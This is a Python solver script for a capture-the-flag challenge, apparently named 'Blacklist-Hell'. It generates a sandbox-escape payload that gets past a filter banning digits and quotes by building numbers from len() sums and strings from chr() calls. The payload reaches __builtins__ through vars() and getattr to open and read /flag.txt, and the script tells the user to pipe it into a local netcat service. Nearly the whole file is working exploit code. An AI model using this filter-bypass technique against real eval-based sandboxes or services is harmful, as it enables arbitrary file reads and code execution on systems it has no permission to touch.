#!/usr/bin/env python3
"""
Simplified solver for Blacklist-Hell
Generates a working payload to read /flag.txt
"""

def num(n):
    """Generate number n without using digits"""
    if n == 0:
        return "len([])"
    if n == 1:
        return "len([[]])"
    
    # For efficiency, use multiplication
    # Build base unit (1)
    one = "len([[]])"
    
    # Build 10
    ten = f"({'+'.join([one]*10)})"
    
    # Decompose n into tens and ones
    tens_count = n // 10
    ones_count = n % 10
    
    parts = []
    if tens_count > 0:
        if tens_count == 1:
            parts.append(ten)
        elif tens_count <= 10:
            # Multiply 10 by a small number (built via addition)
            multiplier = "+".join([one]*tens_count)
            parts.append(f"({ten}*({multiplier}))")
        else:
            # For very large tens, break down further
            # e.g., 95 = 9*10 + 5
            multiplier = "+".join([one]*tens_count)
            parts.append(f"({ten}*({multiplier}))")
    
    if ones_count > 0:
        parts.append("+".join([one]*ones_count))
    
    return f"({'+'.join(parts)})" if len(parts) > 1 else parts[0]

def build_chr(c):
    """Build chr(ord(c)) without using digits"""
    return f"chr({num(ord(c))})"

def build_string(s):
    """Build a string using chr() without quotes or digits"""
    return "+".join([build_chr(c) for c in s])

print("="*70)
print("Blacklist-Hell Payload Generator")
print("="*70)

# Build the strings we need
str_builtins = build_string("__builtins__")
str_open = build_string("open")
str_flag = build_string("/flag.txt")
str_read = build_string("read")

# Construct the full payload
payload = f"getattr(getattr(vars()[{str_builtins}],{str_open})({str_flag}),{str_read})()"

print(f"\nPayload length: {len(payload)} characters")
print(f"\nFirst 200 characters of payload:")
print(payload[:200] + "...")

print(f"\n{'='*70}")
print("Testing payload components:")
print("="*70)

# Test that the components work
print("\nBuilding number 65 (letter 'A'):")
n65 = num(65)
print(f"  {n65[:80]}...")
print(f"  Evaluates to: {eval(n65)}")

print("\nBuilding chr(65):")
chr65 = build_chr('A')
print(f"  {chr65[:80]}...")
print(f"  Evaluates to: '{eval(chr65)}'")

print("\nBuilding string 'open':")
str_open_test = build_string("open")
print(f"  Length: {len(str_open_test)} characters")
print(f"  Evaluates to: '{eval(str_open_test)}'")

print(f"\n{'='*70}")
print("Save this payload to use with netcat:")
print("="*70)
print("\nPayload:")
print(payload)

# Save to file
with open("payload.txt", "w") as f:
    f.write(payload + "\n")
    f.write("dir()\n")  # Second command (dummy)

print("\n✓ Payload saved to payload.txt")
print("\nUsage:")
print("  cat payload.txt | nc localhost 1338")
